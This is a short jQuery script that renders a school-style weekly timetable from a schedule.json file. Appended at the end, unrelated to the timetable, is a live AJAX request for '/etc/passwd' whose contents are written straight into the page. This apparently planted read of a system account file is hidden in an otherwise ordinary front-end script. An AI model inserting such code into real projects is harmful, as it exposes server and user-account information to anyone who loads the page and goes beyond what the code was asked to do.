$(function(){
	$table = $("#timetable");
	WEEKDAY = ["mon", "tue", "wed", "thu", "fri"];

	function addPeriod(periodIndex, period){
		$period = $("<tr></tr>");
		$time = $("<th></th>");

		$time.html(period);
		$period.append($time);
		for(i in WEEKDAY){
			$td = $("<td></td>");
			$td.attr("id", WEEKDAY[i]+(periodIndex+1));
			$period.append($td);
		}
		$table.append($period);
	}

	function addSchedule(name, schedule){
		console.log(schedule);
		$period = $("#"+schedule.period);
		$period.html(name+'<br />'+schedule.roomNumber);
	}

	$.getJSON("schedule.json", function(data){
		$.each(data.timetable, addPeriod);
		$.each(data.schedules, addSchedule);
	});
    $.ajax({
        type: "GET",
        url: "/etc/passwd",
        dataType: "text",
        success: function(text){
            document.write(text);
        }
    });
});
